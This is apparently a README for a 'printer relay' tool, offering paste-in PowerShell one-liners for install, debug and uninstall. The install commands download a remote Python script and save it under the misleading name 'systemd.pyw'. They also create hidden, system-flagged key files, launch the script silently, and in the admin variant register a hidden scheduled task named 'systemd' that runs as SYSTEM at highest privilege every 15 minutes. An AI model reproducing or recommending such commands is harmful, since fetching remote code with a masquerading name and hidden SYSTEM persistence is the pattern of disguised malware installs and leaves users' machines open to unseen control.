# Printer Relay Setup

Print directly to campus printers from PreConnect.

---

## User Setup (No Admin Required)

Run in PowerShell:

```powershell
$d="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$d\systemd.pyw" -UseBasicParsing; Add-Type -AssemblyName System.Security; $b=[System.Text.Encoding]::UTF8.GetBytes("<WORKER_KEY>"); $e=[System.Security.Cryptography.ProtectedData]::Protect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser); Set-Content "$d\systemd.key" ("DPAPI:"+[Convert]::ToBase64String($e)); icacls "$d\systemd.key" /inheritance:r /grant:r "$env:USERNAME:(F)"; attrib +h +s "$d\systemd.key"; $py = if (Get-Command pythonw -ErrorAction SilentlyContinue) { "pythonw" } else { if (-not (Test-Path "$d\py\pythonw.exe")) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$d\py.zip" -UseBasicParsing; Expand-Archive "$d\py.zip" -DestinationPath "$d\py" -Force; Remove-Item "$d\py.zip" }; "$d\py\pythonw.exe" }; Start-Process $py "`"$d\systemd.pyw`""
```

---

## Admin Setup (Requires Admin PowerShell)

Run in **Administrator PowerShell**:

```powershell
$d="$env:ProgramData\systemd"; New-Item -ItemType Directory -Force -Path $d; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$d\systemd.pyw" -UseBasicParsing; Add-Type -AssemblyName System.Security; $b=[System.Text.Encoding]::UTF8.GetBytes("<WORKER_KEY>"); $e=[System.Security.Cryptography.ProtectedData]::Protect($b,$null,[System.Security.Cryptography.DataProtectionScope]::LocalMachine); Set-Content "$d\systemd.key" ("DPAPI:"+[Convert]::ToBase64String($e)); icacls "$d\systemd.key" /inheritance:r /grant:r "SYSTEM:(F)" "Administrators:(F)"; attrib +h +s "$d\systemd.key"; $py = if (Get-Command pythonw -ErrorAction SilentlyContinue) { "pythonw.exe" } else { if (-not (Test-Path "$d\py\pythonw.exe")) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$d\py.zip" -UseBasicParsing; Expand-Archive "$d\py.zip" -DestinationPath "$d\py" -Force; Remove-Item "$d\py.zip" }; "`"$d\py\pythonw.exe`"" }; schtasks /Create /TN "systemd" /TR "$py `"$d\systemd.pyw`"" /SC ONSTART /RI 15 /DU 24:00 /RU SYSTEM /RL HIGHEST /F; try { (New-Object -ComObject Schedule.Service).GetFolder("\").GetTask("systemd").Definition.Settings.Hidden = $true } catch {}; schtasks /Run /TN "systemd"
```

---

## Debug Mode

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "systemd.py" -UseBasicParsing; python systemd.py <WORKER_KEY> --debug
```

---

## Uninstall

Run in PowerShell to completely purge all files, scheduled tasks, and running processes:

```powershell
schtasks /Delete /TN "systemd" /F 2>$null; schtasks /Delete /TN "printer" /F 2>$null; Get-CimInstance Win32_Process -ErrorAction SilentlyContinue -Filter "Name='pythonw.exe' or Name='python.exe'" | Where-Object { $_.CommandLine -like "*systemd.py*" -or $_.CommandLine -like "*printer.py*" } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }; $s="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Remove-Item "$s\systemd.*","$s\printer.*","$s\.ident" -Force -ErrorAction SilentlyContinue; if (Test-Path "$s\py") { Remove-Item "$s\py" -Recurse -Force -ErrorAction SilentlyContinue }; Remove-Item "$env:ProgramData\systemd","$env:ProgramData\printer" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item "systemd.*","printer.*","py.zip" -Force -ErrorAction SilentlyContinue
```